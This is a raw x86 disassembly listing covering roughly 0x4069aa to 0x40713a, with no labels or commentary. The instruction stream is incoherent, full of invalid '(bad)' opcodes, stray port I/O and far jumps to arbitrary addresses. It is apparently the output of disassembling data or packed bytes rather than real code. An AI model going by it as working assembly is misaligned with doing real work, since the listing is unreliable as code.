  4069aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069ab:	pusha  
  4069ac:	stos   BYTE PTR es:[edi],al
  4069ad:	xchg   ebx,eax
  4069ae:	pop    es
  4069af:	ds in  al,0xd4
  4069b2:	add    DWORD PTR [ebp-0x1e],ebx
  4069b5:	cmp    al,0x9e
  4069b7:	cmp    esp,DWORD PTR [ebp-0x48b344a5]
  4069bd:	in     eax,0x3b
  4069bf:	or     eax,0xd1123013
  4069c4:	or     BYTE PTR [esp+ebp*1],dl
  4069c7:	xor    dl,BYTE PTR [esi-0x421fd3bb]
  4069cd:	push   ebx
  4069ce:	sub    BYTE PTR [ebx],0x77
  4069d1:	bound  ebp,QWORD PTR [eax]
  4069d3:	aaa    
  4069d4:	ins    BYTE PTR es:[edi],dx
  4069d5:	cs pushf 
  4069d7:	aas    
  4069d8:	jno    0x406a2b
  4069da:	pop    eax
  4069db:	(bad)  
  4069dd:	in     eax,0xcf
  4069df:	jae    0x4069f3
  4069e1:	push   0x67
  4069e3:	adc    BYTE PTR [ecx],bl
  4069e5:	mov    al,cl
  4069e7:	jb     0x406a2b
  4069e9:	sti    
  4069ea:	loopne 0x406a64
  4069ec:	(bad)  
  4069ed:	jbe    0x4069d5
  4069ef:	or     BYTE PTR [eax],bh
  4069f1:	pop    esp
  4069f2:	mov    ch,0x14
  4069f4:	xor    cl,BYTE PTR [ebx]
  4069f6:	popa   
  4069f7:	fldenv [esi+0xda3f65]
  4069fd:	jno    0x406a26
  4069ff:	nop
  406a00:	cli    
  406a01:	pusha  
  406a02:	jg     0x4069ef
  406a04:	jle    0x406991
  406a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a07:	jge    0x406a1d
  406a09:	mov    ebp,0x1daa37c7
  406a0e:	aaa    
  406a0f:	jnp    0x4069f2
  406a11:	iret   
  406a12:	and    al,BYTE PTR [edx+0x3191823e]
  406a18:	pop    ebp
  406a19:	ins    DWORD PTR es:[edi],dx
  406a1a:	ds popa 
  406a1c:	scas   al,BYTE PTR es:[edi]
  406a1d:	aam    0x56
  406a1f:	call   0xc86c:0x57e027f1
  406a26:	push   edx
  406a27:	loope  0x406a38
  406a29:	lea    ebp,[ebx+0x53318bcf]
  406a2f:	in     al,dx
  406a30:	mov    esp,0x8b62eba0
  406a35:	es fcomp st(6)
  406a38:	in     al,dx
  406a39:	push   0xb270a460
  406a3e:	mov    al,0x30
  406a40:	push   ss
  406a41:	es nop
  406a43:	mov    BYTE PTR [edi+edx*4+0x3e897d4a],dl
  406a4a:	mov    edi,0xf26367df
  406a4f:	(bad)  
  406a50:	ror    ch,0xea
  406a53:	test   DWORD PTR [edx+0x6a],ecx
  406a56:	xor    cl,BYTE PTR [esi+ebx*8-0x2e71a899]
  406a5d:	push   ebx
  406a5e:	das    
  406a5f:	in     al,dx
  406a60:	mov    edx,0xf0d0d5db
  406a65:	in     eax,0xf
  406a67:	shr    DWORD PTR [edx+ebx*4+0x14],cl
  406a6b:	outs   dx,DWORD PTR ds:[esi]
  406a6c:	idiv   BYTE PTR [ebx-0x40]
  406a6f:	jge    0x4069fd
  406a71:	aaa    
  406a72:	(bad)  [ecx+0x4c]
  406a75:	push   cs
  406a76:	(bad)  
  406a77:	loope  0x406ab1
  406a79:	fidiv  DWORD PTR [edx-0x67]
  406a7c:	fadd   QWORD PTR [ebx-0x13befd11]
  406a82:	out    0x22,eax
  406a84:	fdivr  QWORD PTR [edi+0x2b]
  406a87:	pusha  
  406a88:	cwde   
  406a89:	lods   eax,DWORD PTR ds:[esi]
  406a8a:	mov    ebp,0x6ce3c064
  406a8f:	popa   
  406a90:	adc    DWORD PTR [ebx+0x57],ebx
  406a93:	sbb    al,0x27
  406a95:	dec    edi
  406a96:	leave  
  406a97:	push   ebx
  406a98:	cli    
  406a99:	or     BYTE PTR [ecx],0x7a
  406a9c:	mov    eax,ds:0xbfc1a285
  406aa1:	aas    
  406aa2:	push   ecx
  406aa3:	and    esp,eax
  406aa5:	adc    eax,DWORD PTR [ebx]
  406aa7:	gs test al,0x2f
  406aaa:	or     al,0x4a
  406aac:	mov    bh,0xed
  406aae:	lahf   
  406aaf:	sbb    DWORD PTR ds:0x1093b6fa,edi
  406ab5:	sub    DWORD PTR [ebp-0x4a7c4d8a],ebx
  406abb:	neg    DWORD PTR [edx-0x11]
  406abe:	sti    
  406abf:	ins    BYTE PTR es:[edi],dx
  406ac0:	pop    ecx
  406ac1:	call   0x860b:0x46ca3296
  406ac8:	repz dec esp
  406aca:	fcmovnbe st,st(4)
  406acc:	bnd jns 0x406aaf
  406acf:	leave  
  406ad0:	stc    
  406ad1:	and    edx,esp
  406ad3:	inc    ebx
  406ad4:	aas    
  406ad5:	arpl   WORD PTR [esi-0x50],bx
  406ad8:	sbb    eax,0xe34b085d
  406add:	(bad)  [esi]
  406adf:	div    DWORD PTR [edi-0xb]
  406ae2:	retfw  0xabae
  406ae6:	mov    ecx,0xf95c4ba5
  406aeb:	ret    
  406aec:	xor    esp,ecx
  406aee:	or     ebx,DWORD PTR [ecx+eax*8+0x4b6d54a2]
  406af5:	inc    ebx
  406af6:	sar    BYTE PTR [ecx+0x76],cl
  406af9:	shl    DWORD PTR [edi+eax*8-0x1030a23c],0xf0
  406b01:	(bad)  
  406b02:	cdq    
  406b03:	sar    DWORD PTR [eax+ebx*8],1
  406b06:	cmp    BYTE PTR [eax],cl
  406b08:	shl    BYTE PTR [ebx-0x3f],cl
  406b0b:	cmp    ecx,DWORD PTR [eax]
  406b0d:	push   edx
  406b0e:	pushf  
  406b0f:	xchg   BYTE PTR [ebp+edi*8+0x2a],dh
  406b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b14:	mov    dh,0x9b
  406b16:	lods   eax,DWORD PTR ds:[esi]
  406b17:	int    0x94
  406b19:	mov    DWORD PTR [edx],esi
  406b1b:	adc    edx,edx
  406b1d:	pop    esi
  406b1e:	push   ebx
  406b1f:	hlt    
  406b20:	in     eax,0x40
  406b22:	pop    ds
  406b23:	cmp    al,0xfe
  406b25:	add    al,0x63
  406b27:	sbb    BYTE PTR [edx-0x48],dl
  406b2a:	cmc    
  406b2b:	push   ebp
  406b2c:	mov    eax,0x4ebe9857
  406b31:	push   edx
  406b32:	jle    0x406b94
  406b34:	cmp    eax,0x7328d77a
  406b39:	pop    ecx
  406b3a:	xor    DWORD PTR [ebp+0x25],ebp
  406b3d:	rcl    BYTE PTR [edi+0x39],1
  406b40:	xor    al,0xb4
  406b42:	sbb    edx,edx
  406b44:	addr16 sub eax,0x82f57575
  406b4a:	push   ds
  406b4b:	dec    ebp
  406b4c:	scas   eax,DWORD PTR es:[edi]
  406b4d:	ds mov esp,0xe52a787
  406b53:	jne    0x406bcf
  406b55:	sbb    BYTE PTR [ebp-0x5d7ee722],dh
  406b5b:	adc    al,0x48
  406b5d:	fadd   DWORD PTR [eax+0x2885a188]
  406b63:	mov    DWORD PTR [ecx],eax
  406b65:	mov    ds:0x7b479de5,al
  406b6a:	sub    esi,DWORD PTR [esi+0x5b]
  406b6d:	adc    DWORD PTR [edi-0x74],edx
  406b70:	retf   
  406b71:	(bad)  
  406b72:	outs   dx,BYTE PTR ds:[esi]
  406b73:	test   eax,0xb55c564c
  406b78:	mov    dl,0xc0
  406b7a:	mov    bh,0xa1
  406b7c:	sbb    dl,BYTE PTR [esi+0x63]
  406b7f:	pop    ebx
  406b80:	sbb    al,0xf9
  406b82:	fsub   st(6),st
  406b84:	lods   eax,DWORD PTR ds:[esi]
  406b85:	mov    al,ds:0x440f356
  406b8a:	pop    ebp
  406b8b:	add    al,0xfe
  406b8d:	(bad)  
  406b8e:	jmp    0x38a1:0x111a3be3
  406b95:	inc    ebx
  406b96:	mov    edi,0x5d18a716
  406b9b:	push   edi
  406b9c:	xlat   BYTE PTR ds:[ebx]
  406b9d:	mov    edx,0x37fa0176
  406ba2:	mov    ah,0xef
  406ba4:	icebp  
  406ba5:	test   eax,0x57bca10f
  406baa:	js     0x406be9
  406bac:	jecxz  0x406bb4
  406bae:	pop    ebp
  406baf:	adc    eax,0x512ad957
  406bb4:	add    DWORD PTR [eax-0x16],ecx
  406bb7:	pop    ebx
  406bb8:	jmp    0x79c56de0
  406bbd:	fmul   QWORD PTR [ebp-0x39e7e022]
  406bc3:	and    al,BYTE PTR [edi-0x1f59df2b]
  406bc9:	mov    dl,0xbf
  406bcb:	fsubp  st(0),st
  406bcd:	push   0xffffff96
  406bcf:	in     al,0xd9
  406bd1:	data16 stc 
  406bd3:	iret   
  406bd4:	inc    ebx
  406bd6:	push   edi
  406bd7:	xchg   ebx,eax
  406bd8:	test   al,0xb6
  406bda:	sub    BYTE PTR [edx+0x253010ba],bl
  406be0:	les    eax,FWORD PTR [edi+esi*4+0x7]
  406be4:	jecxz  0x406b85
  406be6:	or     dh,dh
  406be8:	sub    ebx,DWORD PTR [eax+0x56]
  406beb:	sub    DWORD PTR [esi-0x73],0x1e6eba1c
  406bf2:	dec    eax
  406bf3:	int    0x86
  406bf5:	call   0x87ffc02b
  406bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bfb:	outs   dx,BYTE PTR ds:[esi]
  406bfc:	cmp    DWORD PTR [ebp+0x74eb8393],esi
  406c02:	call   DWORD PTR [ecx-0x29136d48]
  406c08:	clc    
  406c09:	or     eax,0x3563d6e6
  406c0e:	dec    edi
  406c0f:	aaa    
  406c10:	fsubr  QWORD PTR [edi-0x41]
  406c13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c14:	(bad)  
  406c15:	fst    QWORD PTR [ebx+eiz*4-0xa8ba8e8]
  406c1c:	xchg   ebx,eax
  406c1d:	push   ds
  406c1e:	fcom   QWORD PTR [edx-0x6]
  406c21:	in     al,0x43
  406c23:	js     0x406c1f
  406c25:	inc    edx
  406c26:	retf   
  406c27:	shl    DWORD PTR [edi+0x63aa8fbb],0x9a
  406c2e:	pop    ss
  406c2f:	xchg   edi,eax
  406c30:	push   edx
  406c31:	jbe    0x406c27
  406c33:	jp     0x406c5b
  406c35:	sub    dh,BYTE PTR [ebx]
  406c37:	(bad)  
  406c38:	aam    0xa9
  406c3a:	not    esi
  406c3c:	add    BYTE PTR [esi],0x7b
  406c3f:	xchg   edx,eax
  406c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c41:	retf   0x995c
  406c44:	and    ebx,DWORD PTR [edi]
  406c46:	mov    al,ds:0x44d75031
  406c4b:	inc    edx
  406c4c:	jns    0x406cac
  406c4e:	call   0x411b2a87
  406c53:	or     eax,0x8dd9f814
  406c58:	push   ebp
  406c59:	cdq    
  406c5a:	cs mov edx,0x611d0b7f
  406c60:	mov    esi,0x6b603744
  406c65:	sub    ah,BYTE PTR [edi+ecx*4]
  406c68:	dec    ecx
  406c69:	test   ch,dl
  406c6b:	je     0x406cb9
  406c6d:	sub    eax,0x1f53878b
  406c72:	push   0xbed5cd9a
  406c77:	nop
  406c78:	mov    WORD PTR [ebx],?
  406c7a:	inc    edi
  406c7b:	jmp    0x3155c91b
  406c80:	pop    DWORD PTR [edx]
  406c82:	mov    al,ds:0x1c1f4bc
  406c87:	inc    eax
  406c88:	pop    ds
  406c89:	stc    
  406c8a:	jns    0x406c32
  406c8c:	rcl    BYTE PTR [ecx+0x1182da2d],cl
  406c92:	aas    
  406c93:	jbe    0x406cfb
  406c95:	outs   dx,DWORD PTR ds:[esi]
  406c96:	retf   
  406c97:	xchg   esp,eax
  406c98:	push   ss
  406c99:	imul   edx,DWORD PTR [eax-0x62],0xffffffcc
  406c9d:	jl     0x406d0e
  406c9f:	pop    ds
  406ca0:	mov    cl,0x28
  406ca2:	jle    0x406cc5
  406ca4:	or     esi,DWORD PTR [esi+edi*1+0x13]
  406ca8:	and    DWORD PTR [eax+0x7817b16],esp
  406cae:	test   BYTE PTR [edx+eax*4+0x6b],0xd9
  406cb3:	xchg   esi,eax
  406cb4:	adc    BYTE PTR [ebx+0x20],cl
  406cb7:	mov    eax,edx
  406cb9:	push   esi
  406cba:	and    DWORD PTR [ebx],esi
  406cbc:	push   ecx
  406cbd:	fs push ds
  406cbf:	inc    edx
  406cc0:	jo     0x406d2f
  406cc2:	xor    al,al
  406cc4:	clc    
  406cc5:	mov    ah,0x6a
  406cc7:	mov    dh,0x2
  406cc9:	icebp  
  406cca:	(bad)  
  406ccb:	outs   dx,DWORD PTR ds:[esi]
  406ccc:	pushf  
  406ccd:	vpmaxub ymm0,ymm6,YMMWORD PTR [ecx]
  406cd1:	shr    BYTE PTR [edi+0xeff2068],0x7c
  406cd8:	xlat   BYTE PTR ds:[ebx]
  406cd9:	push   edi
  406cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cdb:	pop    ebx
  406cdc:	xor    BYTE PTR [edx+0x12],ch
  406cdf:	aas    
  406ce0:	clc    
  406ce1:	into   
  406ce2:	ins    BYTE PTR es:[edi],dx
  406ce3:	jmp    0x7187af4e
  406ce8:	ss je  0x406d14
  406ceb:	imul   ebx,esi,0x54abd4f2
  406cf1:	lods   eax,DWORD PTR ds:[esi]
  406cf2:	call   0xa7fe:0xdf88c413
  406cf9:	mov    edi,0xba97455d
  406cfe:	(bad)  [eax-0x4b1de977]
  406d04:	adc    DWORD PTR [ebx+0x2cf5eabf],0xec74933b
  406d0e:	cmp    eax,0x9f9315d6
  406d13:	dec    ebp
  406d14:	jns    0x406cdf
  406d16:	int    0x3b
  406d18:	push   ebp
  406d19:	push   edx
  406d1a:	les    esi,FWORD PTR [eax+0x49]
  406d1d:	arpl   WORD PTR [edi+0x20e7f4fa],di
  406d23:	(bad)  
  406d24:	push   edx
  406d25:	mov    WORD PTR [edi+edx*2-0x7e],?
  406d29:	mov    ebx,0x3f1c97d4
  406d2e:	loopne 0x406cc6
  406d30:	and    al,0xe6
  406d32:	daa    
  406d33:	adc    al,0x93
  406d35:	(bad)  
  406d36:	jnp    0x406cf0
  406d38:	cmp    DWORD PTR [edx+0x1c],esi
  406d3b:	inc    ecx
  406d3c:	mov    al,0x17
  406d3e:	dec    edi
  406d3f:	or     bh,BYTE PTR [ebx+0x7498eed]
  406d45:	repnz or eax,0x125118
  406d4b:	push   0x67
  406d4d:	data16 rcr al,0x9e
  406d51:	inc    esi
  406d52:	jb     0x406d69
  406d54:	aam    0x6
  406d56:	mov    ebx,0x77c9a531
  406d5b:	mov    esi,0xc09d2711
  406d60:	jmp    0x581c:0x83073513
  406d67:	rcl    dl,cl
  406d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d6a:	adc    DWORD PTR [ecx+0x46],eax
  406d6d:	inc    ebx
  406d6e:	sub    DWORD PTR [ebx],edi
  406d70:	xchg   edx,eax
  406d71:	push   ds
  406d72:	mov    ds:0xa63c4642,eax
  406d77:	pop    edi
  406d78:	inc    edi
  406d79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d7a:	inc    edx
  406d7b:	int    0x70
  406d7d:	add    al,0x4b
  406d7f:	add    dl,bh
  406d81:	mov    eax,0xabe53506
  406d86:	jmp    0x406dc7
  406d88:	xchg   ecx,eax
  406d89:	ja     0x406d73
  406d8b:	xchg   esp,eax
  406d8c:	(bad)  
  406d8d:	pop    esp
  406d8e:	push   0xa5c07830
  406d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d94:	dec    ecx
  406d95:	or     DWORD PTR [edx+0xb],esi
  406d98:	sub    ch,BYTE PTR [eax+eax*4]
  406d9b:	dec    edi
  406d9c:	jmp    0x3af8:0x1b23c689
  406da3:	dec    edx
  406da4:	jg     0x406df6
  406da6:	jle    0x406d7c
  406da8:	sub    eax,0x1ee18cf0
  406dad:	mov    edi,0xb6bf848a
  406db2:	mov    edi,0xbd0ac5c1
  406db7:	push   esi
  406db8:	test   DWORD PTR [eax+edi*4-0xd],eax
  406dbc:	mov    ebx,DWORD PTR [ebx+0x2fb9e1ad]
  406dc2:	and    BYTE PTR [ebx+0x23],dh
  406dc5:	lea    edi,[ecx]
  406dc7:	mov    ebp,0xa3108d24
  406dcc:	inc    edi
  406dcd:	push   ecx
  406dce:	and    DWORD PTR [edx],0x6f92ab12
  406dd4:	fs repnz xchg edi,eax
  406dd7:	pop    edi
  406dd8:	jmp    0x35da:0xce0f5e3
  406ddf:	cmp    bl,BYTE PTR [eax]
  406de1:	and    BYTE PTR [edx-0x2],ch
  406de4:	sub    ebx,ebp
  406de6:	call   0x8671d502
  406deb:	xor    DWORD PTR [edi],ebx
  406ded:	pop    edi
  406dee:	fnstcw WORD PTR [ebp+0x18]
  406df1:	test   eax,0xfe66c71e
  406df6:	mov    dh,0x28
  406df8:	mov    edi,0xd9adcf97
  406dfd:	mov    bl,0xa9
  406dff:	sti    
  406e00:	mov    ecx,0x7ab74e20
  406e05:	loope  0x406dd2
  406e07:	das    
  406e08:	push   edx
  406e09:	jp     0x406de2
  406e0b:	pop    edi
  406e0c:	sub    DWORD PTR [edx+0x2f],ebx
  406e0f:	adc    al,0xff
  406e11:	(bad)  
  406e12:	fdivr  st,st(5)
  406e14:	ja     0x406dc7
  406e16:	pop    ecx
  406e17:	sbb    bh,dl
  406e19:	mov    al,0xa0
  406e1b:	inc    edx
  406e1c:	mov    di,0xb8f8
  406e20:	mov    bl,BYTE PTR [ebx+0x58]
  406e23:	std    
  406e24:	xchg   BYTE PTR [edx+0x1b],cl
  406e27:	adc    eax,0xa6cca292
  406e2c:	jne    0x406e2b
  406e2e:	aam    0x8a
  406e30:	sub    esp,esi
  406e32:	je     0x406e9c
  406e34:	add    al,0x36
  406e36:	pop    ebx
  406e37:	xor    bl,cl
  406e39:	xor    ecx,edx
  406e3b:	mov    ds:0x57f00df,al
  406e40:	cmp    DWORD PTR [ebx-0x17],ebx
  406e43:	xchg   ebp,eax
  406e44:	pop    edi
  406e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e46:	or     ecx,ebp
  406e48:	(bad)  
  406e49:	xchg   esp,eax
  406e4a:	pop    edi
  406e4b:	and    ebp,DWORD PTR [ebx-0x11]
  406e4e:	add    eax,0x5f2f7ec6
  406e53:	sahf   
  406e54:	popa   
  406e55:	std    
  406e56:	sar    DWORD PTR [ebp-0x55d13d7e],cl
  406e5c:	mov    ebp,0x964d33a6
  406e61:	xchg   edx,eax
  406e62:	fsubp  st(7),st
  406e64:	xor    edi,DWORD PTR [edx-0x60]
  406e67:	xchg   ebx,eax
  406e68:	and    edi,ebp
  406e6a:	xchg   ebp,eax
  406e6b:	mov    DWORD PTR [esi+0x4661d641],ebx
  406e71:	mov    bh,0x1b
  406e73:	push   edx
  406e74:	mul    DWORD PTR [edx+esi*2]
  406e77:	mov    ebp,0x4d5147e5
  406e7c:	scas   eax,DWORD PTR es:[edi]
  406e7d:	mov    esp,0x6e6cafb6
  406e82:	xor    DWORD PTR [ecx],ebp
  406e84:	and    ebp,DWORD PTR [ecx]
  406e86:	xchg   esp,eax
  406e87:	cmp    eax,0x2fc8d104
  406e8c:	dec    edi
  406e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e8e:	je     0x406e80
  406e90:	mov    esi,0xb7905188
  406e95:	mov    eax,0x6e4155a7
  406e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e9b:	outs   dx,DWORD PTR ds:[esi]
  406e9c:	sub    al,0xd
  406e9e:	addr16 aas 
  406ea0:	push   eax
  406ea1:	pop    ds
  406ea2:	popa   
  406ea3:	jo     0x406ef6
  406ea5:	sar    edx,cl
  406ea7:	inc    DWORD PTR [ebx+0x6e]
  406eaa:	stos   DWORD PTR es:[edi],eax
  406eab:	pop    edi
  406eac:	retf   0x17e7
  406eaf:	das    
  406eb0:	pop    eax
  406eb1:	or     ecx,DWORD PTR [ebp+0x23]
  406eb4:	add    cl,bl
  406eb6:	cmp    eax,DWORD PTR [esi-0x305c9d42]
  406ebc:	ss dec eax
  406ebe:	js     0x406f1b
  406ec0:	icebp  
  406ec1:	retf   
  406ec2:	pop    edx
  406ec3:	mov    ds:0xe127dd65,eax
  406ec8:	ja     0x406eaa
  406eca:	sub    al,0xf2
  406ecc:	and    al,0xd2
  406ece:	out    dx,al
  406ecf:	mov    esi,0x854a3aa7
  406ed4:	push   es
  406ed5:	mov    eax,0xc0dcf428
  406eda:	mov    bl,0x96
  406edc:	xor    al,0xda
  406ede:	cli    
  406edf:	jmp    0x1176:0x716fcad4
  406ee6:	loopne 0x406f50
  406ee8:	add    eax,0x219aad78
  406eed:	stos   DWORD PTR es:[edi],eax
  406eee:	hlt    
  406eef:	scas   eax,DWORD PTR es:[edi]
  406ef0:	pop    esi
  406ef1:	mov    ah,0x99
  406ef3:	push   eax
  406ef4:	sysexit 
  406ef6:	ja     0x406ee3
  406ef8:	sbb    al,0xa5
  406efa:	mov    al,ds:0x8eca9aff
  406eff:	mov    ebp,0x57778ae
  406f04:	scas   al,BYTE PTR es:[edi]
  406f05:	push   0xd52c0492
  406f0a:	and    dh,dh
  406f0c:	dec    edi
  406f0d:	jae    0x406ebd
  406f0f:	test   eax,0x47d05b7d
  406f14:	(bad)  
  406f15:	outs   dx,BYTE PTR ds:[esi]
  406f16:	mov    ebx,0x2226d9b1
  406f1b:	mov    dh,0xdf
  406f1d:	pop    edi
  406f1e:	call   0x4f88:0x8c4605ac
  406f25:	in     eax,0xae
  406f27:	xchg   BYTE PTR [ebp-0x1bea4326],dh
  406f2d:	mov    edx,0x74539735
  406f32:	scas   eax,DWORD PTR es:[edi]
  406f33:	in     al,0x2a
  406f35:	and    BYTE PTR [eax+0x3f63b6d8],ch
  406f3b:	addr16 jmp 0x406f27
  406f3e:	xchg   ecx,eax
  406f3f:	mov    bl,0xeb
  406f41:	lock inc esp
  406f43:	daa    
  406f44:	fs (bad) 
  406f46:	bound  edi,QWORD PTR [eax]
  406f48:	jns    0x406f6e
  406f4a:	add    al,0x23
  406f4c:	fwait
  406f4d:	sbb    bl,dl
  406f4f:	mov    dl,0x9b
  406f51:	ffreep st(6)
  406f53:	push   es
  406f54:	push   ds
  406f55:	pop    esp
  406f56:	xor    ah,BYTE PTR [edi]
  406f58:	or     eax,0x6b005f84
  406f5d:	leave  
  406f5e:	(bad)  
  406f5f:	push   ebx
  406f60:	sbb    al,0xd6
  406f62:	cmp    esi,esp
  406f64:	hlt    
  406f65:	ins    DWORD PTR es:[edi],dx
  406f66:	xor    DWORD PTR ds:0x6cc5654e,0x1c7acb0
  406f70:	xchg   ebx,eax
  406f71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f72:	add    DWORD PTR [ebx],0xa353dbe
  406f78:	cld    
  406f79:	push   edx
  406f7a:	inc    esi
  406f7b:	stos   DWORD PTR es:[edi],eax
  406f7c:	outs   dx,DWORD PTR ds:[esi]
  406f7d:	or     dh,al
  406f7f:	sahf   
  406f80:	dec    edx
  406f81:	dec    ebx
  406f82:	std    
  406f83:	push   eax
  406f84:	sub    esp,DWORD PTR [ecx]
  406f86:	sti    
  406f87:	mov    ds,ecx
  406f89:	fstp   TBYTE PTR [edi+0x71335f44]
  406f8f:	mov    eax,0x27e70d6e
  406f94:	mov    cl,0xe7
  406f96:	sub    esp,DWORD PTR [ebx]
  406f98:	jbe    0x406fba
  406f9a:	test   eax,0x1de68b1a
  406f9f:	int3   
  406fa0:	inc    ebp
  406fa1:	sbb    DWORD PTR ds:0x55a6955e,ebx
  406fa7:	mov    edi,0xe923264c
  406fac:	loopne 0x407019
  406fae:	(bad)  
  406faf:	ror    BYTE PTR [edi-0x51],1
  406fb2:	stc    
  406fb3:	nop
  406fb4:	xchg   ebx,eax
  406fb5:	leave  
  406fb6:	inc    esi
  406fb7:	hlt    
  406fb8:	jmp    0x9a7f:0xb8c0055e
  406fbf:	cld    
  406fc0:	mov    cl,0xec
  406fc2:	dec    eax
  406fc3:	sub    ch,cl
  406fc5:	and    edx,edi
  406fc7:	inc    ebx
  406fc8:	mov    al,0x30
  406fca:	lock call 0xdc3e:0xebdf933c
  406fd2:	(bad)  
  406fd3:	push   ecx
  406fd4:	std    
  406fd5:	mov    bh,0x22
  406fd7:	scas   eax,DWORD PTR es:[edi]
  406fd8:	lods   eax,DWORD PTR ds:[esi]
  406fd9:	jmp    0x407050
  406fdb:	in     al,dx
  406fdc:	test   al,0x46
  406fde:	fwait
  406fdf:	or     BYTE PTR [edi-0x1d36343],ch
  406fe5:	ds adc al,0x70
  406fe8:	out    dx,eax
  406fe9:	jmp    0x406fc2
  406feb:	inc    ecx
  406fec:	jmp    0x228c5c02
  406ff1:	pop    ds
  406ff2:	mov    WORD PTR ds:0xdbdc227e,cs
  406ff8:	push   edi
  406ff9:	fimul  DWORD PTR [edx-0x76]
  406ffc:	dec    ebx
  406ffd:	xchg   esi,eax
  406ffe:	sbb    eax,0xe154aeae
  407003:	daa    
  407004:	scas   al,BYTE PTR es:[edi]
  407005:	and    eax,0x206cb285
  40700a:	sar    BYTE PTR [eax],0x7a
  40700d:	cmp    al,0x22
  40700f:	xchg   DWORD PTR [ebx+0x623d2520],esp
  407015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407016:	mov    esp,0xbec54dbb
  40701b:	push   ebp
  40701c:	and    esi,esp
  40701e:	xor    DWORD PTR [ebx-0x3d1f1a5f],esp
  407024:	jg     0x406fa7
  407026:	jmp    0x257b47b2
  40702b:	push   esp
  40702c:	outs   dx,DWORD PTR ds:[esi]
  40702d:	mov    ah,0xf3
  40702f:	push   edi
  407030:	rcl    BYTE PTR [edi],1
  407032:	mov    al,0x49
  407034:	retf   0x2928
  407037:	cmp    eax,0xb3e8ea92
  40703c:	repnz aad 0x4f
  40703f:	fnstsw WORD PTR [ecx+0x6d]
  407042:	(bad)  
  407045:	or     esi,DWORD PTR [edi+0x6b]
  407048:	and    esi,DWORD PTR [ebx+edi*8-0x13ec46ec]
  40704f:	or     al,0x3f
  407051:	lahf   
  407052:	dec    edi
  407053:	adc    eax,DWORD PTR [ebx]
  407055:	cld    
  407056:	xchg   BYTE PTR [eax],ah
  407058:	dec    edi
  407059:	inc    edx
  40705a:	xor    al,0x23
  40705c:	cld    
  40705d:	mov    ebx,0xd8818c9e
  407062:	ss xchg ebx,eax
  407064:	das    
  407065:	cmp    BYTE PTR [ebp+0x60],dh
  407068:	mov    dl,0xdd
  40706a:	stc    
  40706b:	icebp  
  40706c:	pop    ebp
  40706d:	mov    ds:0xa7b83533,eax
  407072:	das    
  407073:	push   0xb4583123
  407078:	or     eax,0x1cddb70f
  40707d:	mov    eax,ds:0xe7ab9233
  407082:	cmp    al,0x14
  407084:	fs das 
  407086:	hlt    
  407087:	repz (bad) 
  407089:	jecxz  0x4070a1
  40708b:	into   
  40708c:	mov    dh,0x16
  40708e:	lods   al,BYTE PTR ss:[esi]
  407090:	xor    dh,BYTE PTR [ebx-0x3a]
  407093:	push   edx
  407094:	imul   esp,DWORD PTR [ecx],0x24
  407097:	jg     0x407094
  407099:	cdq    
  40709a:	ret    0xbeca
  40709d:	push   0x63
  40709f:	fidivr DWORD PTR [edx+0x142f933e]
  4070a5:	xchg   edx,eax
  4070a6:	shl    DWORD PTR [eax],0xb2
  4070a9:	add    ch,BYTE PTR [ebp-0x2587f7fc]
  4070af:	mov    al,0xf2
  4070b1:	das    
  4070b2:	xor    dh,bh
  4070b4:	ror    DWORD PTR [edx],1
  4070b6:	(bad)  
  4070b7:	int3   
  4070b8:	fwait
  4070b9:	ins    BYTE PTR es:[edi],dx
  4070ba:	in     al,0xbd
  4070bc:	push   0xa0082b52
  4070c1:	pop    edx
  4070c2:	inc    esp
  4070c3:	in     eax,dx
  4070c4:	jae    0x407065
  4070c6:	mov    cl,0xe
  4070c8:	mov    ebp,0xe7ba2fb4
  4070cd:	inc    edx
  4070ce:	sar    ch,cl
  4070d0:	xchg   BYTE PTR [edx],bh
  4070d2:	rcl    DWORD PTR [eax],1
  4070d4:	enter  0x8fa1,0xee
  4070d8:	idiv   DWORD PTR [esi+0x46]
  4070db:	fst    DWORD PTR [ebx+0x227db96]
  4070e1:	jge    0x4070df
  4070e3:	stos   BYTE PTR es:[edi],al
  4070e4:	fsub   QWORD PTR [edx+0x4c]
  4070e7:	jb     0x40709e
  4070e9:	adc    dh,bh
  4070eb:	cmc    
  4070ec:	push   edi
  4070ed:	sub    BYTE PTR [edx-0x5033b52],dl
  4070f3:	sub    eax,0xb4bf8ddd
  4070f8:	inc    ecx
  4070f9:	add    esp,DWORD PTR [esi+0x4c]
  4070fc:	jmp    0xb5fe1253
  407101:	mov    ch,0x5f
  407103:	lods   al,BYTE PTR ds:[esi]
  407104:	cdq    
  407105:	jno    0x4070fc
  407107:	xchg   dh,bh
  407109:	std    
  40710a:	ins    DWORD PTR es:[edi],dx
  40710b:	shr    ebp,0xe0
  40710e:	xchg   edi,eax
  40710f:	mov    cl,0x42
  407111:	scas   eax,DWORD PTR es:[edi]
  407112:	xchg   bl,ah
  407114:	xor    cl,BYTE PTR [ecx]
  407116:	inc    esp
  407117:	sbb    ecx,esi
  407119:	xchg   esi,eax
  40711a:	in     eax,dx
  40711b:	inc    eax
  40711c:	jle    0x407134
  40711e:	mov    al,ds:0x9ee6e87f
  407123:	popa   
  407124:	or     DWORD PTR [eax+0x72],ecx
  407127:	lods   al,BYTE PTR ds:[esi]
  407128:	adc    al,0xed
  40712a:	pusha  
  40712b:	int    0x2d
  40712d:	pop    ss
  40712e:	icebp  
  40712f:	imul   ebx,DWORD PTR [ebx-0x37],0xffffff9e
  407133:	std    
  407134:	dec    esp
  407135:	sbb    eax,0xd8f8fcc0
  40713a:	sbb    DWORD PTR [ebp+0xf],eax
